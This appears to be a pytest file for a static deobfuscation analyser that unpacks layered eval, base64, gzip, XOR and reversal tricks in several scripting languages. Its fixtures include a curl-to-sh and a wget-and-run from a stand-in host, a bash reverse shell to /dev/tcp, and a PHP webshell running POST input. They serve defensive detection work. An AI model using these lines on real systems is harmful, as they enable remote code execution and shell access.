"""Improve languages, phase 4: PHP, Perl, Ruby, Lua, Tcl, shell, AutoIt and AutoHotkey evaluated
statically (nothing runs): layers through eval / load / Execute / ``| sh``, decoders, loops named in
the recipe, files written, commands followed, downloads and calls that depend on the machine.
"""

from __future__ import annotations

import base64
import gzip
import json
import sys
import zlib
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex.resolve import au3_eval, dyn_eval, sh_eval, tcl_eval  # noqa: E402

PE = b"MZ" + b"\x90\x00" * 30 + b" inert DocuTraceX stub " * 4


def _raw_deflate(b: bytes) -> bytes:
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    return co.compress(b) + co.flush()


# --- unit cases ---------------------------------------------------------------------------------
@pytest.mark.parametrize(("lang", "code", "stage", "recipe"), [
    ("PHP", "<?php eval(gzinflate(base64_decode('%s')));" % base64.b64encode(_raw_deflate(b"echo 'php layer two';")).decode(),
     "echo 'php layer two';", ("base64", "inflate", "eval")),
    ("PHP", "<?php $f = 'str' . '_rot13'; eval($f('rpub \\'ebg13 vf ernq\\';'));", "echo 'rot13 is read';", ("rot13", "eval")),
    ("PHP", "<?php $x = create_function('', strrev(';\\'desrever\\' ohce')); $x();", "echo 'reversed';", ("reverse", "create_function")),
    ("Perl", "use MIME::Base64; eval decode_base64('%s');" % base64.b64encode(b"print 'perl layer';").decode(),
     "print 'perl layer';", ("base64", "eval")),
    ("Perl", "my $h = pack('H*', '%s'); eval $h;" % b"print 'hex layer';".hex(), "print 'hex layer';", ("pack(H*)", "eval")),
    ("Ruby", "eval(Base64.decode64('%s'))" % base64.b64encode(b"puts 'ruby layer'").decode(), "puts 'ruby layer'", ("base64", "eval")),
    ("Lua", "load(string.char(%s))()" % ",".join(str(c) for c in b"print('lua layer two')"), "print('lua layer two')", ("char codes", "load")),
])
def test_layers(lang: str, code: str, stage: str, recipe: tuple) -> None:
    s = dyn_eval.resolve_lang(code, lang)
    st = s.stages[0]
    assert st.data == stage and st.recipe == recipe


def test_php_loops_webshell_and_writes() -> None:
    key = "fx"
    body = b"system('echo php xor loop decoded');"
    enc = base64.b64encode(bytes(c ^ ord(key[i % 2]) for i, c in enumerate(body))).decode()
    s = dyn_eval.resolve_lang("<?php $k='fx'; $d=base64_decode('" + enc + "'); $o='';"
                              " for($i=0;$i<strlen($d);$i++){ $o .= chr(ord($d[$i]) ^ ord($k[$i % strlen($k)])); }"
                              " @assert($o); system($_POST['c']);"
                              f" file_put_contents('/tmp/x.exe', base64_decode('{base64.b64encode(PE).decode()}'));", "PHP")
    assert s.stages[0].data == body.decode() and s.stages[0].recipe == ("base64", "xor(key k)", "assert")
    assert any(st.kind == "write" and st.data == PE for st in s.stages)
    assert any("the web request ($_POST)" == u["depends_on"] for u in s.unresolved)


def test_shell_pipelines() -> None:
    inner = b"curl -s https://billing-portal.example/x.sh | sh\n"
    s = sh_eval.resolve(f"echo '{base64.b64encode(gzip.compress(inner)).decode()}' | base64 -d | gunzip | sh")
    assert s.stages[0].data == inner.decode() and s.stages[0].recipe == ("literal", "base64", "gzip", "| sh")
    assert s.downloads[0]["use"].startswith("runs it as code")
    s = sh_eval.resolve("printf '" + "".join("\\x%02x" % c for c in b"echo printf stage text") + "' | bash\n"
                        "wget -q https://billing-portal.example/b -O /tmp/b; chmod +x /tmp/b; /tmp/b &\n"
                        "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\nc=$(cat /etc/hostname); $c\n")
    assert s.stages[0].data == "echo printf stage text"
    d = {x["url"]: x for x in s.downloads}
    assert "runs it" in d["https://billing-portal.example/b"]["use"] and "tcp://203.0.113.9:4444" in d
    assert "/etc/hostname" in s.unresolved[0]["depends_on"]


def test_tcl_and_autoit() -> None:
    s = tcl_eval.resolve("eval [zlib decompress [binary decode base64 %s]]" % base64.b64encode(zlib.compress(b"puts {tcl layer}")).decode())
    assert s.stages[0].data == "puts {tcl layer}" and s.stages[0].recipe[-3:] == ("base64", "zlib decompress", "eval")
    s = au3_eval.resolve('$s = StringReverse("' + 'Run("cmd /c echo au3 reversed")'[::-1].replace('"', '""') + '")\nExecute($s)\n'
                         '$n = RegRead("HKCU\\Software\\Fx", "n")\nExecute($n)\n')
    assert s.stages[0].data == 'Run("cmd /c echo au3 reversed")' and s.stages[0].recipe == ("reverse", "Execute")
    assert "registry" in s.unresolved[0]["depends_on"]


# --- the samples, end to end ----------------------------------------------------------------------
@pytest.mark.parametrize(("name", "gen", "lang", "want"), [
    ("sample_php_webshell.php", "php_webshell", "PHP", {("exec", 0), ("exec", 1), ("write", 2)}),
    ("sample_perl_dropper.pl", "perl_dropper", "Perl", {("exec", 0), ("write", 1), ("exec", 1)}),
    ("sample_ruby_loader.rb", "ruby_loader", "Ruby", {("exec", 0), ("exec", 1), ("write", 1)}),
    ("sample_lua_loader.lua", "lua_loader", "Lua", {("exec", 0), ("write", 1), ("exec", 1)}),
    ("sample_tcl_loader.tcl", "tcl_loader", "Tcl", {("exec", 0), ("exec", 1), ("write", 1)}),
    ("sample_shell_dropper.sh", "shell_dropper", "shell", {("exec", 0), ("exec", 1), ("write", 0)}),
    ("sample_autoit_crypt.au3", "autoit_crypt_au3", "AutoIt", {("load", 0), ("exec", 0), ("write", 0)}),
    ("sample_ahk_dropper.ahk", "ahk_dropper", "AutoHotkey", {("exec", 0), ("write", 0)}),
])
def test_samples_end_to_end(client, name: str, gen: str, lang: str, want: set) -> None:  # noqa: ANN001,F811
    _cid, res = _analyze(client, name, getattr(_ms(), gen)())
    sc = json.loads((res / "script.json").read_text())
    r = next(s for s in sc["scripts"] if s.get("resolution"))["resolution"]
    got = {(s["kind"], s["depth"]) for s in r["stages"]}
    assert want <= got, (name, got)
    assert r["downloads"], name
    assert all("billing-portal.example" in d["url"] or d["url"].startswith("tcp://203.0.113.") for d in r["downloads"])
    rules = {f["rule"] for f in sc["findings"]}
    assert any(x.endswith("_resolved_stages") for x in rules)
    tree = json.loads((res / "nested.json").read_text())["tree"]
    assert tree, name                                    # the stages reached Nested
